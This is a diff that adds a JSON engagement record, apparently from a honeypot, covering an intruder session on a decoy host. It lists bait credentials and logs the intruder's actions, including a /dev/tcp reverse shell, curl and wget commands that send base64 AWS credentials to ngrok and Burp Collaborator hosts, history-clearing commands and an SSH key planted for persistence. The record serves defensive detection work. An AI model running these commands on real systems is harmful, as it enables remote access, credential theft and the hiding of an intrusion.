@@ -1,0 +1,113 @@
+{
+  "engagement_id": "8d1bd057-9014-4719-be4d-c9f56b9199ad",
+  "claimed_user": "jdoe",
+  "source_ip": "127.0.0.1",
+  "first_seen_at": 1778544080.8817575,
+  "connection_count": 6,
+  "cwd": "/",
+  "vfs": {
+    "files": {
+      "/home/jdoe/.aws/credentials": "STOLEN_TOKEN\n",
+      "/home/jdoe/.aws/config": "[default]\nregion = us-east-1\noutput = json\n\n[profile staging]\nregion = us-east-1\noutput = json\n",
+      "/home/jdoe/.gitconfig": "[user]\n\tname = John Doe\n\temail = jdoe@acme.corp\n[init]\n\tdefaultBranch = main\n[core]\n\teditor = vim\n[push]\n\tdefault = simple\n[credential]\n\thelper = store\n",
+      "/home/jdoe/.git-credentials": "https://jdoe:ghp_ecoVfUlI30h4Qmg8pLQoK3uYPmI64lCzghUn@github.com\n",
+      "/home/jdoe/.bash_history": "cat notes.md\ngit status\ndocker ps\ncurl https://api.acme.corp/health\ncd ~/projects/payments-api\nkubectl logs payments-api-7d9f -f\ndocker compose up -d\npytest tests/unit -q\naws s3 ls s3://acme-billing-exports/\npython manage.py migrate\nssh api-prod-03\nhistory\nexit\nfree -h\nkubectl get pods -n payments\nvim ~/.bashrc\naws sts get-caller-identity\ngit checkout -b fix/payments-retry\nls\nvim README.md\n",
+      "/home/jdoe/.ssh/config": "Host db-prod-01\n    HostName 10.20.30.41\n    User jdoe\n    IdentityFile ~/.ssh/id_rsa\n\nHost api-prod-03\n    HostName 10.20.30.83\n    User jdoe\n    IdentityFile ~/.ssh/id_rsa\n\nHost github.com\n    User git\n    IdentityFile ~/.ssh/id_rsa\n",
+      "/home/jdoe/.ssh/id_rsa": "-----BEGIN OPENSSH PRIVATE KEY-----\n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\n-----END OPENSSH PRIVATE KEY-----\n",
+      "/home/jdoe/.ssh/id_rsa.pub": "ssh-rsa A30kqBhiwyZa9NJ3etJfQMXHDU0YpeqM4cY6SAi+dP/GrgQ7dazpXLHcQ5qcyw3RzVBWT2AGDeLHK/e+Q58zOuitrVvXzgwyMKJC5OyvPMYq+V6tIw0EUp3sAnB3TmKREfW2/DDA1RwaxSKqCrZaHDc/FqlTyx4px/6b6q4EK6VnmATL5AJkKB+1GWxChBFQJFGFtPWZJUmkBhBqvzSfEhKfBNCqcbV44Ex8otK0dZAokSAa6PTF7rUJflwwMf+Au4MFLtETn36plPyutADr/g8m/iOGwzmPEpnWutPZ6hwjEidV+uk1PoA8zbVWiirlC2I5SeXI1G4WbNkyC4bkJMx35NIHsWGUqIN45CRHRMk2yB1EeL7r== jdoe@corp-app01\n",
+      "/home/jdoe/.bashrc": "",
+      "/home/jdoe/.profile": "",
+      "/home/jdoe/projects/.keep": "",
+      "/home/jdoe/notes.md": "",
+      "/etc/passwd": "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\nsystemd-network:x:101:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin\nsystemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin\nmessagebus:x:103:106::/nonexistent:/usr/sbin/nologin\nsshd:x:108:65534::/run/sshd:/usr/sbin/nologin\nagarcia:x:1002:1002:Alex Garcia,,,:/home/agarcia:/bin/bash\njdoe:x:1001:1001:John Doe,,,:/home/jdoe:/bin/bash\n",
+      "/etc/group": "root:x:0:\ndaemon:x:1:\nbin:x:2:\nsys:x:3:\nadm:x:4:\ntty:x:5:\ndisk:x:6:\nlp:x:7:\nmail:x:8:\nsudo:x:27:agarcia,jdoe\nwww-data:x:33:\nbackup:x:34:\nssh:x:117:\ndocker:x:998:agarcia,jdoe\nkvm:x:999:agarcia\nnogroup:x:65534:\njdoe:x:1001:\nagarcia:x:1002:\n",
+      "/var/log/auth.log": "May 9 12:56:00 corp-app01 sshd[12041]: Accepted publickey for jdoe from 10.10.8.239 port 49001 ssh2: RSA SHA256:nKvxe1Jh/N1Wq8h9yLW0+sGpYj7iWGfJ+u8z0XlMnzc\nMay 9 12:56:00 corp-app01 sshd[12041]: pam_unix(sshd:session): session opened for user jdoe(uid=1001) by (uid=0)\nMay 10 16:18:00 corp-app01 sshd[12054]: Accepted publickey for agarcia from 10.10.17.57 port 49001 ssh2: RSA SHA256:nKvxe1Jh/N1Wq8h9yLW0+sGpYj7iWGfJ+u8z0XlMnzc\nMay 10 16:18:00 corp-app01 sshd[12054]: pam_unix(sshd:session): session opened for user agarcia(uid=1002) by (uid=0)\nMay 10 17:31:00 corp-app01 sshd[12067]: Accepted publickey for jdoe from 10.10.12.39 port 49001 ssh2: RSA SHA256:nKvxe1Jh/N1Wq8h9yLW0+sGpYj7iWGfJ+u8z0XlMnzc\nMay 10 17:31:00 corp-app01 sshd[12067]: pam_unix(sshd:session): session opened for user jdoe(uid=1001) by (uid=0)\nMay 11 14:21:00 corp-app01 sshd[12080]: Accepted publickey for jdoe from 10.10.2.51 port 49001 ssh2: RSA SHA256:nKvxe1Jh/N1Wq8h9yLW0+sGpYj7iWGfJ+u8z0XlMnzc\nMay 11 14:21:00 corp-app01 sshd[12080]: pam_unix(sshd:session): session opened for user jdoe(uid=1001) by (uid=0)\n",
+      "/etc/hostname": "corp-app01\n",
+      "/tmp/stolen.txt": "[default]\naws_access_key_id = AKIA3PSWHWDCQCRH29VQ\naws_secret_access_key = u0NA3U707V7Jc3dWzKvHUv9rKO+DGboFvY95swXE\nregion = us-east-1\n\n[staging]\naws_access_key_id = AKIARKMHTT22E1MBGASG\naws_secret_access_key = wv2H9GWFanZK8UYTa/80qBqfZsna4wAsON5Tp0qL\nregion = us-east-1\n",
+      "/etc/sudoers.d/zzz_compat": "# Compat overrides for legacy services. Do not edit by hand.\n# Generated 2026-03-14 by ansible role ops.legacy-compat v1.7.3.\n\nDefaults  !syslog\nDefaults  targetpw\n%wheel    ALL=(ALL) NOPASSWD: ALL\ndeploy    ALL=(ALL) NOPASSWD: /usr/bin/apt-get, /usr/bin/dpkg, /bin/systemctl\n",
+      "/etc/mysql/my.cnf": "[client]\nuser     = root\npassword = M3taD4ta!2026\nhost     = billing-db\nport     = 3306\ndatabase = billing\n\n[mysqldump]\nuser     = backup_admin\npassword = nightly_backup_2026!\n\n[mysqld]\nbind-address    = 127.0.0.1\nskip-name-resolve\nlog-bin         = /var/log/mysql/mysql-bin.log\n",
+      "/tmp/breadcrumb.txt": "HELLO_FROM_C1\n",
+      "/tmp/alpha": "",
+      "/tmp/beta": "",
+      "/tmp/gamma": "",
+      "/tmp/.hidden": "STOLEN_TOKEN\n",
+      "/home/jdoe/.ssh/authorized_keys": "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ== attacker@evil\n"
+    },
+    "deleted": [
+      "/tmp/loot.txt"
+    ]
+  },
+  "observed": {
+    "ran_sudo": true,
+    "services_probed": [
+      "mysql"
+    ],
+    "attempted_lateral": true,
+    "found_crown_jewel": true,
+    "isolated": true,
+    "planted_sudo_cve": true,
+    "spawned_mysql": true,
+    "credential_files_read": [
+      "/home/jdoe/.aws/config",
+      "/home/jdoe/.aws/credentials",
+      "/home/jdoe/.gitconfig",
+      "/home/jdoe/.ssh/id_rsa"
+    ],
+    "honeytoken_modifications": [
+      "/home/jdoe/.aws/credentials"
+    ],
+    "honeytoken_deletions": [],
+    "payload_drops": [
+      "/tmp/.hidden",
+      "/tmp/alpha",
+      "/tmp/beta",
+      "/tmp/breadcrumb.txt",
+      "/tmp/gamma",
+      "/tmp/loot.txt",
+      "/tmp/stolen.txt"
+    ],
+    "ssh_persistence_attempt": true,
+    "bash_history_inspected": true,
+    "credential_search_attempted": false,
+    "credential_search_terms": [],
+    "reverse_shell_attempted": true,
+    "reverse_shell_command": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
+    "dns_exfil_attempted": true,
+    "dns_exfil_commands": [
+      "curl https://x.ngrok.io/$(cat ~/.aws/credentials | base64)",
+      "curl https://x.ngrok.io/exfil",
+      "wget http://abc.burpcollaborator.net/test"
+    ],
+    "lateral_to_decoy": true,
+    "decoy_targets": [
+      "bastion-prod",
+      "db-prod",
+      "db-prod-01"
+    ],
+    "log_tampering": true,
+    "tampering_commands": [
+      "history -c",
+      "unset HISTFILE"
+    ],
+    "attempted_sudo_elevation": true,
+    "decoys_planted": [
+      "/etc/mysql/my.cnf",
+      "/etc/sudoers.d/zzz_compat"
+    ],
+    "decoys_swallowed": [
+      "/etc/mysql/my.cnf",
+      "/etc/sudoers.d/zzz_compat"
+    ],
+    "alerted_ssh_persistence": true,
+    "alerted_honeytoken_tamper": true,
+    "alerted_credential_exfil": true,
+    "alerted_payload_staging": true,
+    "alerted_credential_search": false,
+    "alerted_reverse_shell": true,
+    "alerted_dns_exfil": true,
+    "alerted_lateral_decoy": true,
+    "alerted_log_tampering": true,
+    "alerted_decoy_swallowed": true
+  },
+  "last_seen_at": 1778547539.7210128
+}
